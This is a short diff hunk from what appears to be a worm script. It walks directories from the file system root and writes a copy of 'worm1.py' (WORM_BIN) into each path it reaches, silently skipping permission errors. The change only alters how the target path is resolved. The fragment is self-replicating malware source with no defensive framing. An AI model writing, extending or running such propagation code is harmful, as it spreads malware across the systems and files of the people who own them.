@@ -24,7 +24,7 @@ chdir('/')
 def traverse(path):
     # plant worm1.py in the absolute path currently on
     try:
-        with open(path+"\worm1.py", "wb") as outfile:
+        with open(ospath.realpath(path)+"\worm1.py", "wb") as outfile:
             outfile.write(WORM_BIN)
     except PermissionError:
         pass
